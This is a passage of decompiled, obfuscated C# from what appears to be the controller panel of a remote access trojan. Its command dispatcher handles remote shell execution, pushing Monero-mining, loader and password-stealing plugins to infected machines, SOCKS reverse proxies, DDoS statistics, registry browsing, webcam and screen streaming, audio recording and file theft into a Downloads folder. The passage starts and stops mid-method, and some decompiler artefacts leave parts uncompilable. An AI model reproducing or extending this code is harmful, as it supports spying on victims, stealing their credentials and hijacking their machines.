																	}
																	cclient7.fDB.method_100(ref class2.class152_0.string_0[0]);
																}
																else if (Operators.CompareString(left2, "aud_rec", true) == 0)
																{
																	if (cclient7.fDB == null)
																	{
																		CClient cclient138 = cclient7;
																		bool flag = true;
																		cclient138.SOCKET_DISCONNECT(ref flag);
																		goto IL_7149;
																	}
																	new Thread(new ThreadStart(class2._Lambda$__15)).Start();
																}
																else if (Operators.CompareString(left2, "aud_rec_list", true) == 0)
																{
																	if (cclient7.fDB == null)
																	{
																		CClient cclient139 = cclient7;
																		bool flag = true;
																		cclient139.SOCKET_DISCONNECT(ref flag);
																		goto IL_7149;
																	}
																	fDashboard fDB18 = cclient7.fDB;
																	string text = Encoding.UTF8.GetString(Convert.FromBase64String(class2.class152_0.string_0[0]));
																	fDB18.method_96(ref text);
																}
																else if (Operators.CompareString(left2, "shell_start", true) == 0)
																{
																	bool flag;
																	if (cclient7.fDB == null)
																	{
																		CClient cclient140 = cclient7;
																		flag = true;
																		cclient140.SOCKET_DISCONNECT(ref flag);
																		goto IL_7149;
																	}
																	fDashboard fDB19 = cclient7.fDB;
																	flag = true;
																	fDB19.method_120(ref flag);
																}
																else if (Operators.CompareString(left2, "shell_stop", true) == 0)
																{
																	bool flag;
																	if (cclient7.fDB == null)
																	{
																		CClient cclient141 = cclient7;
																		flag = true;
																		cclient141.SOCKET_DISCONNECT(ref flag);
																		goto IL_7149;
																	}
																	fDashboard fDB20 = cclient7.fDB;
																	flag = false;
																	fDB20.method_120(ref flag);
																}
																else if (Operators.CompareString(left2, "shell_exec", true) == 0)
																{
																	if (cclient7.fDB == null)
																	{
																		CClient cclient142 = cclient7;
																		bool flag = true;
																		cclient142.SOCKET_DISCONNECT(ref flag);
																		goto IL_7149;
																	}
																	cclient7.fDB.method_121(ref class2.class152_0.string_0[0]);
																}
																else if (Operators.CompareString(left2, "con_list", true) == 0)
																{
																	if (cclient7.fDB == null)
																	{
																		CClient cclient143 = cclient7;
																		bool flag = true;
																		cclient143.SOCKET_DISCONNECT(ref flag);
																		goto IL_7149;
																	}
																	new Thread(new ThreadStart(class2.class152_0._Lambda$__16)).Start();
																}
																else if (Operators.CompareString(left2, "xmr_mine_start", true) == 0)
																{
																	Class130.fMinerXMR_0.method_0(cclient7.sKey, cclient7.sUser);
																}
																else if (Operators.CompareString(left2, "xmr_mine_stop", true) == 0)
																{
																	Class130.fMinerXMR_0.method_2(cclient7.sKey);
																}
																else
																{
																	if (Operators.CompareString(left2, "xmr_mine_req", true) == 0)
																	{
																		if (Operators.CompareString(class2.class152_0.string_0[0], "0", true) != 0)
																		{
																			goto IL_70F8;
																		}
																		string sKey8 = cclient7.sKey;
																		string str21 = "xmr_mine_data|";
																		string text = Application.StartupPath + "\\data\\plugins\\xmr.plg";
																		string str22 = Class136.smethod_29(ref text);
																		string str23 = "|";
																		text = Application.StartupPath + "\\data\\plugins\\xmr.plg";
																		string string_17 = str21 + str22 + str23 + Class136.smethod_13(ref text);
																		string string_18 = sKey8;
																		Class136.Class138 class4 = new Class136.Class138();
																		class4.string_0 = string_18;
																		class4.string_1 = string_17;
																		class4.long_0 = 0L;
																		try
																		{
																			if (Class130.concurrentDictionary_3.ContainsKey(class4.string_0))
																			{
																				new Thread(new ThreadStart(class4._Lambda$__0)).Start();
																			}
																			goto IL_70F8;
																		}
																		catch (Exception ex38)
																		{
																			goto IL_70F8;
																		}
																	}
																	if (Operators.CompareString(left2, "xmr_mine_ready", true) == 0)
																	{
																		string sKey9 = cclient7.sKey;
																		string string_17 = "xmr_mine_start|" + cclient7.MINER_LAST_SETTINGS;
																		string string_18 = sKey9;
																		Class136.Class138 class4 = new Class136.Class138();
																		class4.string_0 = string_18;
																		class4.string_1 = string_17;
																		class4.long_0 = 0L;
																		try
																		{
																			if (Class130.concurrentDictionary_3.ContainsKey(class4.string_0))
																			{
																				new Thread(new ThreadStart(class4._Lambda$__0)).Start();
																			}
																			goto IL_70F8;
																		}
																		catch (Exception ex39)
																		{
																			goto IL_70F8;
																		}
																	}
																	if (Operators.CompareString(left2, "xmr64_mine_req", true) == 0)
																	{
																		if (Operators.CompareString(class2.class152_0.string_0[0], "0", true) != 0)
																		{
																			goto IL_70F8;
																		}
																		string sKey10 = cclient7.sKey;
																		string str24 = "xmr64_mine_data|";
																		string text = Application.StartupPath + "\\data\\plugins\\xmr64.plg";
																		string str25 = Class136.smethod_29(ref text);
																		string str26 = "|";
																		text = Application.StartupPath + "\\data\\plugins\\xmr64.plg";
																		string string_17 = str24 + str25 + str26 + Class136.smethod_13(ref text);
																		string string_18 = sKey10;
																		Class136.Class138 class4 = new Class136.Class138();
																		class4.string_0 = string_18;
																		class4.string_1 = string_17;
																		class4.long_0 = 0L;
																		try
																		{
																			if (Class130.concurrentDictionary_3.ContainsKey(class4.string_0))
																			{
																				new Thread(new ThreadStart(class4._Lambda$__0)).Start();
																			}
																			goto IL_70F8;
																		}
																		catch (Exception ex40)
																		{
																			goto IL_70F8;
																		}
																	}
																	if (Operators.CompareString(left2, "xmr64_mine_ready", true) == 0)
																	{
																		string sKey11 = cclient7.sKey;
																		string string_17 = "xmr64_mine_start|" + cclient7.MINER_LAST_SETTINGS;
																		string string_18 = sKey11;
																		Class136.Class138 class4 = new Class136.Class138();
																		class4.string_0 = string_18;
																		class4.string_1 = string_17;
																		class4.long_0 = 0L;
																		try
																		{
																			if (Class130.concurrentDictionary_3.ContainsKey(class4.string_0))
																			{
																				new Thread(new ThreadStart(class4._Lambda$__0)).Start();
																			}
																			goto IL_70F8;
																		}
																		catch (Exception ex41)
																		{
																			goto IL_70F8;
																		}
																	}
																	if (Operators.CompareString(left2, "xmr_mine_stats", true) == 0)
																	{
																		if (Class130.fMinerXMR_0.Visible)
																		{
																			Class130.fMinerXMR_0.method_1(cclient7.sKey, class2.class152_0.string_0);
																		}
																	}
																	else if (Operators.CompareString(left2, "xmr_mine_log", true) == 0)
																	{
																		Class130.fMinerXMRLogManager_0.method_0(cclient7.sKey, cclient7.sIP + "^" + cclient7.sUser, class2.class152_0.string_0[0]);
																	}
																	else if (Operators.CompareString(left2, "socks4r_start", true) == 0)
																	{
																		Class130.fSocks4R_0.method_0(cclient7.sKey, cclient7.sUser, class2.class152_0.string_0[0], class2.class152_0.string_0[1]);
																	}
																	else if (Operators.CompareString(left2, "socks4r_stop", true) == 0)
																	{
																		Class130.fSocks4R_0.method_1(cclient7.sKey);
																	}
																	else if (Operators.CompareString(left2, "socks4r_stats", true) == 0)
																	{
																		Class130.fSocks4R_0.method_2(cclient7.sKey, class2.class152_0.string_0);
																	}
																	else if (Operators.CompareString(left2, "socks5_srv_start", true) == 0)
																	{
																		Class130.fSocks5_0.method_1(cclient7.sKey, cclient7.sUser, class2.class152_0.string_0[0], class2.class152_0.string_0[1]);
																	}
																	else if (Operators.CompareString(left2, "socks5_srv_stop", true) == 0)
																	{
																		Class130.fSocks5_0.method_2(cclient7.sKey);
																	}
																	else if (Operators.CompareString(left2, "socks5_srv_stats", true) == 0)
																	{
																		Class130.fSocks5_0.method_3(cclient7.sKey, class2.class152_0.string_0);
																	}
																	else
																	{
																		if (Operators.CompareString(left2, "plg_loader", true) == 0)
																		{
																			string sKey12 = cclient7.sKey;
																			string[] array12 = new string[6];
																			array12[0] = "plg_loader_data|";
																			array12[1] = class2.class152_0.string_0[0];
																			array12[2] = "|";
																			int num74 = 3;
																			string text = Application.StartupPath + "\\data\\plugins\\loader.plg";
																			array12[num74] = Class136.smethod_29(ref text);
																			array12[4] = "|";
																			int num75 = 5;
																			text = Application.StartupPath + "\\data\\plugins\\loader.plg";
																			array12[num75] = Class136.smethod_13(ref text);
																			string string_17 = string.Concat(array12);
																			string string_18 = sKey12;
																			Class136.Class138 class4 = new Class136.Class138();
																			class4.string_0 = string_18;
																			class4.string_1 = string_17;
																			class4.long_0 = 0L;
																			try
																			{
																				if (Class130.concurrentDictionary_3.ContainsKey(class4.string_0))
																				{
																					new Thread(new ThreadStart(class4._Lambda$__0)).Start();
																				}
																				goto IL_70F8;
																			}
																			catch (Exception ex42)
																			{
																				goto IL_70F8;
																			}
																		}
																		if (Operators.CompareString(left2, "crd_logins_req", true) == 0)
																		{
																			if (Operators.CompareString(class2.class152_0.string_0[0], "0", true) != 0)
																			{
																				goto IL_70F8;
																			}
																			string sKey13 = cclient7.sKey;
																			string str27 = "crd_logins_data|";
																			string text = Application.StartupPath + "\\data\\plugins\\pws.plg";
																			string str28 = Class136.smethod_29(ref text);
																			string str29 = "|";
																			text = Application.StartupPath + "\\data\\plugins\\pws.plg";
																			string string_17 = str27 + str28 + str29 + Class136.smethod_13(ref text);
																			string string_18 = sKey13;
																			Class136.Class138 class4 = new Class136.Class138();
																			class4.string_0 = string_18;
																			class4.string_1 = string_17;
																			class4.long_0 = 0L;
																			try
																			{
																				if (Class130.concurrentDictionary_3.ContainsKey(class4.string_0))
																				{
																					new Thread(new ThreadStart(class4._Lambda$__0)).Start();
																				}
																				goto IL_70F8;
																			}
																			catch (Exception ex43)
																			{
																				goto IL_70F8;
																			}
																		}
																		if (Operators.CompareString(left2, "crd_logins", true) == 0)
																		{
																			if (cclient7.fDB == null)
																			{
																				CClient cclient144 = cclient7;
																				bool flag = true;
																				cclient144.SOCKET_DISCONNECT(ref flag);
																				goto IL_7149;
																			}
																			cclient7.fDB.method_2(ref class2.class152_0.string_0[0]);
																		}
																		else
																		{
																			if (Operators.CompareString(left2, "crd_logins_report_req", true) == 0)
																			{
																				if (Operators.CompareString(class2.class152_0.string_0[0], "0", true) != 0)
																				{
																					goto IL_70F8;
																				}
																				string sKey14 = cclient7.sKey;
																				string str30 = "crd_logins_report_data|";
																				string text = Application.StartupPath + "\\data\\plugins\\pws.plg";
																				string str31 = Class136.smethod_29(ref text);
																				string str32 = "|";
																				text = Application.StartupPath + "\\data\\plugins\\pws.plg";
																				string string_17 = str30 + str31 + str32 + Class136.smethod_13(ref text);
																				string string_18 = sKey14;
																				Class136.Class138 class4 = new Class136.Class138();
																				class4.string_0 = string_18;
																				class4.string_1 = string_17;
																				class4.long_0 = 0L;
																				try
																				{
																					if (Class130.concurrentDictionary_3.ContainsKey(class4.string_0))
																					{
																						new Thread(new ThreadStart(class4._Lambda$__0)).Start();
																					}
																					goto IL_70F8;
																				}
																				catch (Exception ex44)
																				{
																					goto IL_70F8;
																				}
																			}
																			if (Operators.CompareString(left2, "crd_logins_report", true) == 0)
																			{
																				Class130.fCredentialsLogins_0.method_3(cclient7.sKey, cclient7.sIP + "^" + cclient7.sUser, class2.class152_0.string_0[0]);
																			}
																			else if (Operators.CompareString(left2, "remotebrowser_info", true) == 0)
																			{
																				if (cclient7.fDB == null)
																				{
																					CClient cclient145 = cclient7;
																					bool flag = true;
																					cclient145.SOCKET_DISCONNECT(ref flag);
																					goto IL_7149;
																				}
																				cclient7.fDB.method_98(ref class2.class152_0.string_0[0]);
																			}
																			else if (Operators.CompareString(left2, "remotebrowser_error", true) == 0)
																			{
																				if (cclient7.fDB == null)
																				{
																					CClient cclient146 = cclient7;
																					bool flag = true;
																					cclient146.SOCKET_DISCONNECT(ref flag);
																					goto IL_7149;
																				}
																				cclient7.fDB.method_99(ref class2.class152_0.string_0[0]);
																			}
																			else if (Operators.CompareString(left2, "remotebrowser_stop", true) == 0)
																			{
																				if (cclient7.fDB == null)
																				{
																					CClient cclient147 = cclient7;
																					bool flag = true;
																					cclient147.SOCKET_DISCONNECT(ref flag);
																					goto IL_7149;
																				}
																				cclient7.fDB.method_97();
																			}
																			else if (Operators.CompareString(left2, "speedtest", true) == 0)
																			{
																				cclient7.sBandwidthDL = class2.class152_0.string_0[0];
																			}
																			else if (Operators.CompareString(left2, "speedtest_started", true) == 0)
																			{
																				cclient7.BANDWIDTHDL = "...";
																			}
																			else if (Operators.CompareString(left2, "soft_list", true) == 0)
																			{
																				if (cclient7.fDB == null)
																				{
																					CClient cclient148 = cclient7;
																					bool flag = true;
																					cclient148.SOCKET_DISCONNECT(ref flag);
																					goto IL_7149;
																				}
																				new Thread(new ThreadStart(class2.class152_0._Lambda$__17)).Start();
																			}
																			else if (Operators.CompareString(left2, "thumb_data", true) == 0)
																			{
																				if (cclient7.fDB == null)
																				{
																					CClient cclient149 = cclient7;
																					bool flag = true;
																					cclient149.SOCKET_DISCONNECT(ref flag);
																					goto IL_7149;
																				}
																				cclient7.fDB.fThumb_0.method_2();
																				MemoryStream stream4 = new MemoryStream(Convert.FromBase64String(class2.class152_0.string_0[0]));
																				cclient7.fDB.fThumb_0.vmethod_0().Image = Image.FromStream(stream4);
																			}
																			else if (Operators.CompareString(left2, "ddos_stats", true) == 0)
																			{
																				if (Class130.fDDOS_0.Visible)
																				{
																					Class130.fDDOS_0.method_1(cclient7.sKey, class2.class152_0.string_0);
																				}
																			}
																			else if (Operators.CompareString(left2, "ddos_stop", true) == 0)
																			{
																				Class130.fDDOS_0.method_2(cclient7.sKey);
																			}
																			else if (Operators.CompareString(left2, "reg_hkeys_get", true) == 0)
																			{
																				if (cclient7.fDB == null)
																				{
																					CClient cclient150 = cclient7;
																					bool flag = true;
																					cclient150.SOCKET_DISCONNECT(ref flag);
																					goto IL_7149;
																				}
																				new Thread(new ThreadStart(class2.class152_0._Lambda$__18)).Start();
																			}
																			else if (Operators.CompareString(left2, "reg_keys_get", true) == 0)
																			{
																				if (cclient7.fDB == null)
																				{
																					CClient cclient151 = cclient7;
																					bool flag = true;
																					cclient151.SOCKET_DISCONNECT(ref flag);
																					goto IL_7149;
																				}
																				new Thread(new ThreadStart(class2.class152_0._Lambda$__19)).Start();
																			}
																			else if (Operators.CompareString(left2, "scr_tb", true) == 0)
																			{
																				if (Class135.smethod_0().UIThumbnails)
																				{
																					MemoryStream stream5 = new MemoryStream(Convert.FromBase64String(class2.class152_0.string_0[0]));
																					cclient7.ICO_STATUS = Image.FromStream(stream5);
																					Class130.imageList_1.Images.Add(cclient7.sKey, cclient7.ICO_STATUS);
																					Class130.fMain_0.method_5(true);
																				}
																			}
																			else if (Operators.CompareString(left2, "dl_dir_obj_count", true) == 0)
																			{
																				Class130.concurrentDictionary_1.TryAdd(class2.class152_0.string_0[0], (int)Math.Round(Conversion.Val(class2.class152_0.string_0[1])));
																			}
																			else if (cclient7.fDB == null)
																			{
																				CClient cclient152 = cclient7;
																				bool flag = true;
																				cclient152.SOCKET_DISCONNECT(ref flag);
																				goto IL_7149;
																			}
																		}
																	}
																}
															}
														}
														IL_70F8:
														fMain ff10 = cclient7.ff;
														CClient cclient153 = cclient7;
														ptr4 = ref cclient153.sKey;
														object value2 = cclient153.sKey;
														ff10.method_24(ref value2);
														ptr4 = Conversions.ToString(value2);
													}
													catch (Exception ex45)
													{
														Class130.concurrentDictionary_3[cclient7.sKey].sPacket.Clear();
													}
													IL_7149:
													cclient2.sock_async.method_6(Encoding.UTF8.GetBytes("1"));
													ptr2 = ref Class130.struct20_0.double_3;
												}
												Class130.struct20_0.double_3 = ptr2 + 1.0;
												CClient cclient154 = Class130.concurrentDictionary_3[cclient2.SOCKET_COMMAND_USER_KEY];
												ptr2 = ref cclient154.stats_bytes_out;
												cclient154.stats_bytes_out = ptr2 + 1.0;
												CClient cclient155 = cclient2;
												bool flag3 = true;
												cclient155.SOCKET_DISCONNECT(ref flag3);
											}
										}
									}
								}
								catch (Exception ex46)
								{
									CClient cclient156 = cclient2;
									bool flag3 = false;
									cclient156.SOCKET_DISCONNECT(ref flag3);
								}
								return;
							}
							if (Operators.CompareString(left, "WB_ST", true) == 0)
							{
								try
								{
									string[] array9 = Strings.Split(text14, "|", 3, CompareMethod.Text);
									cclient2.sock_async.socket_0.ReceiveBufferSize = Class135.smethod_0().TransfersRecvBytes;
									cclient2.WEBCAMSTREAM_ACTIVE = true;
									cclient2.WEBCAMSTREAM_USER_KEY = array9[1];
									ref double ptr2 = ref Class130.struct20_0.double_2;
									Class130.struct20_0.double_2 = ptr2 + (double)num;
									ptr2 = ref Class130.struct20_0.double_4;
									Class130.struct20_0.double_4 = ptr2 + 1.0;
									string key = cclient2.WEBCAMSTREAM_USER_KEY;
									bool flag5;
									try
									{
										flag5 = Class130.concurrentDictionary_3.ContainsKey(key);
										goto IL_7274;
									}
									catch (Exception ex47)
									{
									}
									flag5 = false;
									IL_7274:
									if (!flag5)
									{
										CClient cclient157 = cclient2;
										bool flag3 = false;
										cclient157.SOCKET_DISCONNECT(ref flag3);
									}
									else
									{
										if (array9[2].Length > 0)
										{
											cclient2.sPacket.Append(array9[2]);
										}
										CClient cclient158 = Class130.concurrentDictionary_3[cclient2.WEBCAMSTREAM_USER_KEY];
										ptr2 = ref cclient158.stats_bytes_in;
										cclient158.stats_bytes_in = ptr2 + (double)num;
										Class130.concurrentDictionary_3[cclient2.WEBCAMSTREAM_USER_KEY].WEBCAMSTREAM_SOCKET_ID = cclient2.sKey;
									}
								}
								catch (Exception ex48)
								{
									CClient cclient159 = cclient2;
									bool flag3 = false;
									cclient159.SOCKET_DISCONNECT(ref flag3);
								}
								return;
							}
							if (Operators.CompareString(left, "WC_PR_ST", true) == 0)
							{
								try
								{
									string[] array9 = Strings.Split(text14, "|", 3, CompareMethod.Text);
									cclient2.sock_async.socket_0.ReceiveBufferSize = Class135.smethod_0().TransfersRecvBytes;
									cclient2.WEBCAM_PREVIEW_ACTIVE = true;
									cclient2.WEBCAM_PREVIEW_USER_KEY = array9[1];
									ref double ptr2 = ref Class130.struct20_0.double_2;
									Class130.struct20_0.double_2 = ptr2 + (double)num;
									ptr2 = ref Class130.struct20_0.double_4;
									Class130.struct20_0.double_4 = ptr2 + 1.0;
									string key = cclient2.WEBCAM_PREVIEW_USER_KEY;
									bool flag5;
									try
									{
										flag5 = Class130.concurrentDictionary_3.ContainsKey(key);
										goto IL_73A6;
									}
									catch (Exception ex49)
									{
									}
									flag5 = false;
									IL_73A6:
									if (!flag5)
									{
										CClient cclient160 = cclient2;
										bool flag3 = false;
										cclient160.SOCKET_DISCONNECT(ref flag3);
									}
									else
									{
										Class130.concurrentDictionary_3[cclient2.WEBCAM_PREVIEW_USER_KEY].fPr.method_16();
										Class130.concurrentDictionary_3[cclient2.WEBCAM_PREVIEW_USER_KEY].fPr.string_1 = cclient2.sKey;
										if (array9[2].Length > 0)
										{
											cclient2.sPacket.Append(array9[2]);
										}
										CClient cclient161 = Class130.concurrentDictionary_3[cclient2.WEBCAM_PREVIEW_USER_KEY];
										ptr2 = ref cclient161.stats_bytes_in;
										cclient161.stats_bytes_in = ptr2 + (double)num;
										Class130.concurrentDictionary_3[cclient2.WEBCAM_PREVIEW_USER_KEY].WEBCAM_PREVIEW_SOCKET_ID = cclient2.sKey;
									}
								}
								catch (Exception ex50)
								{
									CClient cclient162 = cclient2;
									bool flag3 = false;
									cclient162.SOCKET_DISCONNECT(ref flag3);
								}
								return;
							}
							if (Operators.CompareString(left, "RB_ST", true) == 0)
							{
								try
								{
									cclient2.sock_async.socket_0.ReceiveBufferSize = Class135.smethod_0().TransfersRecvBytes;
									string[] array9 = Strings.Split(text14, "|", 3, CompareMethod.Text);
									cclient2.REMOTE_BROWSER_ACTIVE = true;
									cclient2.REMOTE_BROWSER_USER_KEY = array9[1];
									CClient cclient163 = Class130.concurrentDictionary_3[cclient2.REMOTE_BROWSER_USER_KEY];
									ref double ptr2 = ref cclient163.stats_bytes_in;
									cclient163.stats_bytes_in = ptr2 + (double)num;
									Class130.concurrentDictionary_3[cclient2.REMOTE_BROWSER_USER_KEY].REMOTE_BROWSER_SOCKET_ID = cclient2.sKey;
									ptr2 = ref Class130.struct20_0.double_2;
									Class130.struct20_0.double_2 = ptr2 + (double)num;
									ptr2 = ref Class130.struct20_0.double_4;
									Class130.struct20_0.double_4 = ptr2 + 1.0;
									string key = cclient2.REMOTE_BROWSER_USER_KEY;
									bool flag5;
									try
									{
										flag5 = Class130.concurrentDictionary_3.ContainsKey(key);
										goto IL_7551;
									}
									catch (Exception ex51)
									{
									}
									flag5 = false;
									IL_7551:
									if (!flag5)
									{
										CClient cclient164 = cclient2;
										bool flag3 = false;
										cclient164.SOCKET_DISCONNECT(ref flag3);
										return;
									}
									if (array9[2].Length > 0)
									{
										cclient2.sPacket.Append(array9[2]);
									}
									goto IL_DF07;
								}
								catch (Exception ex52)
								{
									CClient cclient165 = cclient2;
									bool flag3 = false;
									cclient165.SOCKET_DISCONNECT(ref flag3);
									return;
								}
							}
							if (Operators.CompareString(left, "SC_PR_ST", true) == 0)
							{
								try
								{
									cclient2.sock_async.socket_0.ReceiveBufferSize = Class135.smethod_0().TransfersRecvBytes;
									string[] array9 = Strings.Split(text14, "|", 3, CompareMethod.Text);
									cclient2.SCREEN_PREVIEW_ACTIVE = true;
									cclient2.SCREEN_PREVIEW_USER_KEY = array9[1];
									Class130.concurrentDictionary_3[cclient2.SCREEN_PREVIEW_USER_KEY].fPr.method_16();
									Class130.concurrentDictionary_3[cclient2.SCREEN_PREVIEW_USER_KEY].fPr.string_1 = cclient2.sKey;
									ref double ptr2 = ref Class130.struct20_0.double_2;
									Class130.struct20_0.double_2 = ptr2 + (double)num;
									ptr2 = ref Class130.struct20_0.double_4;
									Class130.struct20_0.double_4 = ptr2 + 1.0;
									string key = cclient2.SCREEN_PREVIEW_USER_KEY;
									bool flag5;
									try
									{
										flag5 = Class130.concurrentDictionary_3.ContainsKey(key);
										goto IL_7682;
									}
									catch (Exception ex53)
									{
									}
									flag5 = false;
									IL_7682:
									if (!flag5)
									{
										CClient cclient166 = cclient2;
										bool flag3 = false;
										cclient166.SOCKET_DISCONNECT(ref flag3);
									}
									else
									{
										if (array9[2].Length > 0)
										{
											cclient2.sPacket.Append(array9[2]);
										}
										CClient cclient167 = Class130.concurrentDictionary_3[cclient2.SCREEN_PREVIEW_USER_KEY];
										ptr2 = ref cclient167.stats_bytes_in;
										cclient167.stats_bytes_in = ptr2 + (double)num;
										Class130.concurrentDictionary_3[cclient2.SCREEN_PREVIEW_USER_KEY].SCREEN_PREVIEW_SOCKET_ID = cclient2.sKey;
									}
								}
								catch (Exception ex54)
								{
									CClient cclient168 = cclient2;
									bool flag3 = false;
									cclient168.SOCKET_DISCONNECT(ref flag3);
								}
								return;
							}
							if (Operators.CompareString(left, "FL_DL", true) == 0)
							{
								double ptr2;
								try
								{
									checked
									{
										Class130.long_2 += 1L;
										cclient2.sock_async.socket_0.ReceiveBufferSize = Class135.smethod_0().TransfersRecvBytes;
										cclient2.sock_async.socket_0.LingerState.Enabled = true;
										string[] array9 = Strings.Split(text14, "|", 8, CompareMethod.Text);
										cclient2.FILE_TRANSFER_ID = "i" + cclient2.mSocketCounter;
										cclient2.FILE_TRANSFER_USER_KEY = array9[1];
										cclient2.FILE_TRANSFER_USER = array9[2];
										cclient2.FILE_TRANSFER_FILENAME = Strings.Replace(Encoding.UTF8.GetString(Convert.FromBase64String(array9[3])), ":", string.Empty, 1, -1, CompareMethod.Text);
										cclient2.FILE_TRANSFER_REMOTE_FILE = array9[3];
										cclient2.FILE_TRANSFER_FILESIZE = array9[4];
										cclient2.FILE_TRANSFER_FILE_LAST_MODIFIED = array9[5];
										cclient2.FILE_TRANSFER_GROUP_ID = Encoding.UTF8.GetString(Convert.FromBase64String(array9[6]));
										cclient2.FILE_TRANSFER_LAST_PACKET = Class136.smethod_36();
										cclient2.FILE_TRANSFER_STARTED = (double)Class136.smethod_36();
										ptr2 = ref Class130.struct20_0.double_2;
									}
									Class130.struct20_0.double_2 = ptr2 + (double)num;
									ptr2 = ref Class130.struct20_0.double_4;
									Class130.struct20_0.double_4 = ptr2 + 1.0;
									string key = cclient2.FILE_TRANSFER_USER_KEY;
									bool flag5;
									try
									{
										flag5 = Class130.concurrentDictionary_3.ContainsKey(key);
										goto IL_7874;
									}
									catch (Exception ex55)
									{
									}
									flag5 = false;
									IL_7874:
									if (!flag5)
									{
										CClient cclient169 = cclient2;
										bool flag3 = false;
										cclient169.SOCKET_DISCONNECT(ref flag3);
										return;
									}
									cclient2.FILE_TRANSFER_ACTIVE = true;
									CClient cclient170 = Class130.concurrentDictionary_3[cclient2.FILE_TRANSFER_USER_KEY];
									ptr2 = ref cclient170.stats_bytes_in;
									cclient170.stats_bytes_in = ptr2 + (double)num;
									stringBuilder.Clear();
								}
								catch (Exception ex56)
								{
									CClient cclient171 = cclient2;
									bool flag3 = false;
									cclient171.SOCKET_DISCONNECT(ref flag3);
									return;
								}
								Class130.fTransferManager_0.method_5(cclient2.FILE_TRANSFER_ID, cclient2.sKey, cclient2.FILE_TRANSFER_USER_KEY, cclient2.FILE_TRANSFER_REMOTE_FILE, checked((long)Math.Round(Conversion.Val(cclient2.FILE_TRANSFER_FILESIZE))), string.Concat(new string[]
								{
									Application.StartupPath,
									"\\Downloads\\",
									cclient2.FILE_TRANSFER_USER,
									"\\",
									cclient2.FILE_TRANSFER_FILENAME
								}), cclient2.FILE_TRANSFER_USER, cclient2.FILE_TRANSFER_GROUP_ID);
								Class130.fTransferManager_0.method_16(cclient2.FILE_TRANSFER_ID, 5, "Downloading");
								fMain ff11 = cclient2.ff;
								CClient cclient172 = cclient2;
								ref string ptr11 = ref cclient172.FILE_TRANSFER_USER_KEY;
								object value3 = cclient172.FILE_TRANSFER_USER_KEY;
								ff11.method_24(ref value3);
								ptr11 = Conversions.ToString(value3);
								int num30;
								int num31;
								try
								{
									if (!Class135.smethod_0().TransferReplaceExisting)
									{
										if (File.Exists(string.Concat(new string[]
										{
											Application.StartupPath,
											"\\Downloads\\",
											cclient2.FILE_TRANSFER_USER,
											"\\",
											cclient2.FILE_TRANSFER_FILENAME
										})))
										{
											fTransferManager fTransferManager_10 = Class130.fTransferManager_0;
											string file_TRANSFER_ID10 = cclient2.FILE_TRANSFER_ID;
											int num76 = 2;
											double num77 = Conversions.ToDouble(cclient2.FILE_TRANSFER_FILESIZE);
											bool flag3 = false;
											ref bool ptr10 = ref flag3;
											double num28 = num77;
											int num78 = num76;
											string string_46 = file_TRANSFER_ID10;
											fTransferManager fTransferManager12 = fTransferManager_10;
											string text6;
											object obj21;
											try
											{
												ProjectData.ClearProjectError();
												num30 = 2;
												string text5 = string.Empty;
												if (num28 >= 1099511627776.0)
												{
													text5 = Strings.Format(num28 / 1024.0 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " TiB";
												}
												else if (num28 >= 1073741824.0)
												{
													text5 = Strings.Format(num28 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " GiB";
												}
												else if (num28 >= 1048576.0)
												{
													text5 = Strings.Format(num28 / 1024.0 / 1024.0, "#0.00") + " MiB";
												}
												else if (num28 >= 1024.0)
												{
													text5 = Strings.Format(num28 / 1024.0, "#0.00") + " KiB";
												}
												else if (num28 < 1024.0)
												{
													text5 = Conversions.ToString(Conversion.Fix(num28)) + " B";
												}
												if (ptr10)
												{
													text5 = Strings.Split(text5, " ", -1, CompareMethod.Text)[0];
												}
												if (text5.Length > 0)
												{
													text6 = text5;
												}
												else
												{
													text6 = " 0 B";
												}
												IL_7B81:
												goto IL_7BD1;
												IL_7B83:
												text6 = "0 B";
												goto IL_7B81;
												IL_7B8C:
												num31 = -1;
												@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num30);
												IL_7BA2:;
											}
											catch when (endfilter(obj21 is Exception & num30 != 0 & num31 == 0))
											{
												Exception ex57 = (Exception)obj22;
												goto IL_7B8C;
											}
											throw ProjectData.CreateProjectError(-2146828237);
											IL_7BD1:
											if (num31 != 0)
											{
												ProjectData.ClearProjectError();
											}
											string string_47 = text6;
											fTransferManager12.method_16(string_46, num78, string_47);
											fTransferManager fTransferManager_11 = Class130.fTransferManager_0;
											string file_TRANSFER_ID11 = cclient2.FILE_TRANSFER_ID;
											int num79 = 3;
											double num80 = 0.0;
											flag3 = false;
											ptr10 = ref flag3;
											num28 = num80;
											int num81 = num79;
											string string_48 = file_TRANSFER_ID11;
											fTransferManager fTransferManager13 = fTransferManager_11;
											object obj23;
											try
											{
												ProjectData.ClearProjectError();
												num30 = 2;
												string text5 = string.Empty;
												if (num28 >= 1099511627776.0)
												{
													text5 = Strings.Format(num28 / 1024.0 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " TiB";
												}
												else if (num28 >= 1073741824.0)
												{
													text5 = Strings.Format(num28 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " GiB";
												}
												else if (num28 >= 1048576.0)
												{
													text5 = Strings.Format(num28 / 1024.0 / 1024.0, "#0.00") + " MiB";
												}
												else if (num28 >= 1024.0)
												{
													text5 = Strings.Format(num28 / 1024.0, "#0.00") + " KiB";
												}
												else if (num28 < 1024.0)
												{
													text5 = Conversions.ToString(Conversion.Fix(num28)) + " B";
												}
												if (ptr10)
												{
													text5 = Strings.Split(text5, " ", -1, CompareMethod.Text)[0];
												}
												if (text5.Length > 0)
												{
													text6 = text5;
												}
												else
												{
													text6 = " 0 B";
												}
												IL_7D8B:
												goto IL_7DDB;
												IL_7D8D:
												text6 = "0 B";
												goto IL_7D8B;
												IL_7D96:
												num31 = -1;
												@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num30);
												IL_7DAC:;
											}
											catch when (endfilter(obj23 is Exception & num30 != 0 & num31 == 0))
											{
												Exception ex58 = (Exception)obj24;
												goto IL_7D96;
											}
											throw ProjectData.CreateProjectError(-2146828237);
											IL_7DDB:
											if (num31 != 0)
											{
												ProjectData.ClearProjectError();
											}
											string str33 = text6;
											fTransferManager13.method_16(string_48, num81, str33 + " (0%)");
											Class130.fTransferManager_0.method_16(cclient2.FILE_TRANSFER_ID, 4, "N/A");
											Class130.fTransferManager_0.method_16(cclient2.FILE_TRANSFER_ID, 5, "Ignored (File already exists)");
											Class130.fTransferManager_0.method_16(cclient2.FILE_TRANSFER_ID, 7, "N/A");
